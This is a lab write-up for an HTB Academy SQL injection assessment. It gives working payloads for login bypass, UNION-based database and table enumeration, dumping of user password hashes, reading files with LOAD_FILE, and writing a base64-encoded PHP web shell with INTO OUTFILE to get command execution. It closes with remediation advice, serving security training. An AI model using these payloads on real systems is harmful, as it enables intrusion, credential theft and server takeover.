# ✅ HTB Academy – Skill Assessment Write-Up
**Module:** SQL Injection Fundamentals  
**Assessment Objective:** Perform a grey-box assessment to identify and exploit SQL injection vulnerabilities, with a focus on demonstrating the real-world impact such as remote code execution (RCE).

---

## 🧭 Initial Recon – Login Page Enumeration

Upon loading the target IP, I was presented with a login form. I began testing for SQL injection using classic authentication bypass payloads.

### ❌ Attempted (unsuccessful) payloads:
```
Username: user' OR '1'='1
Password: pass' OR '1'='1
```
I also tested URL-encoded equivalents (e.g. `%27`) with no success.

### ✅ Successful authentication bypass:
```
Username: user' OR '1'='1'--
```
This payload commented out the password check and successfully bypassed authentication. I was redirected to a payroll dashboard, confirming SQL injection was present in the login logic.

---

## 🔍 Discovery – Column Count and Backend Info

The dashboard featured a search bar—likely tied to the SQL backend. I used **UNION-based injection** to determine the column structure.

### ✅ Column Count Enumeration:
```
' UNION SELECT 1,2,3,4,5-- 
```
Five columns were confirmed when the numbers rendered in the table.

### ✅ Backend System Version:
```
' UNION SELECT 1,2,@@version,4,5-- 
```
**Result:** `10.3.22-MariaDB-1ubuntu1` — indicating MariaDB running on Linux.

---

## 🗃️ Database and Table Enumeration

### ✅ List of Databases:
```
' UNION SELECT 1,2,SCHEMA_NAME,4,5 FROM INFORMATION_SCHEMA.SCHEMATA--
```
**Discovered:**  
- `information_schema`  
- `mysql`  
- `performance_schema`  
- `ilfreight`  
- `backup`

### ✅ Confirm Current Database:
```
' UNION SELECT 1,2,DATABASE(),4,5--
```
**Result:** `ilfreight`

---

## 📦 Tables and Columns

### ✅ Table Enumeration (ilfreight):
```
' UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,4,5 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='ilfreight'--
```
**Tables:** `payment`, `users`

### ✅ Column Enumeration:
```
' UNION SELECT 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA,5 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='ilfreight'--
```

**payment**: `id`, `name`, `month`, `amount`, `tax`  
**users**: `id`, `username`, `password`

---

## 🔐 Extracting Sensitive Data

### ✅ Dump Users Table:
```
' UNION SELECT 1,username,password,4,5 FROM ilfreight.users--
```
**Example result:**  
- `adam` : `1be9f5d3a82847b8acca40544f953515`

---

## ⚠️ Privilege Escalation via SQL

### ✅ Identify Current SQL User:
```
' UNION SELECT 1,USER(),3,4,5--
```
**Result:** `root@localhost`

### ✅ Enumerate Privileges:
```
' UNION SELECT 1,grantee,privilege_type,4,5 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"--
```
**Privileges Granted:** Full access including `FILE`, `CREATE`, `DROP`, `EXECUTE`, `SHUTDOWN`, and more.

---

## 📁 File Access & Web Root Discovery

### ✅ Read Apache Config:
```
' UNION SELECT 1,LOAD_FILE('/etc/apache2/apache2.conf'),3,4,5--
```

---

## ❌ Initial RCE Attempt Failed

Attempted writing a shell directly:
```
' UNION SELECT 1,2,'<?php system($_REQUEST[0]); ?>',4,5 INTO OUTFILE '/var/www/html/test.txt'--
```
**Error:** `Permission denied`

Confirmed `@@secure_file_priv` was unset, but `/html` not writable.

---

## ✅ RCE Achieved via Base64 Payload

### ✅ Encode Shell:
```
echo -n '<?php system($_REQUEST[0]); ?>' | base64
```
**Result:**
```
PD9waHAgc3lzdGVtKCRfUkVRVUVTVFswXSk7ID8+
```

### ✅ Inject via SQL:
```
' UNION SELECT 1,2,FROM_BASE64('PD9waHAgc3lzdGVtKCRfUkVRVUVTVFswXSk7ID8+'),4,5 INTO OUTFILE '/var/www/html/dashboard/shell.php'--
```

### ✅ Final Access:
```
http://TARGET_IP/dashboard/shell.php?0=whoami
```
**Result:** `www-data`  
Used `?0=ls ../../../../../` and `?0=cat ../../../../../flag*.txt` to retrieve the flag.

---

## 🧠 Lessons Learned

- Encoded payloads (e.g., Base64) can bypass input transformation issues.
- Real-world bypasses often depend on understanding *how* data is parsed, validated, and executed.
- Valid syntax isn’t enough—path, permissions, and behavior are key.

---

## 🔐 Remediation Recommendations

1. **Use Prepared Statements** – Avoid dynamic SQL at all costs.
2. **Enforce Least Privilege** – Never allow applications to use `root` or admin-level DB accounts.
3. **Restrict Dangerous Privileges** – Disable `FILE`, `EXECUTE`, `SUPER` unless absolutely required.
4. **Validate and Sanitize Input** – Sanitize across all inputs (login, search, uploads).
5. **Enable `secure_file_priv`** – Restrict file writing to safe, isolated locations.
6. **File System Permissions** – Ensure DB users cannot write to web root directories.
7. **Use WAFs** – Add a Web Application Firewall to block known injection patterns.

---

**Assessment Completed:** {date.today().strftime('%B %d, %Y')}  
**Analyst:** Jordan Davis
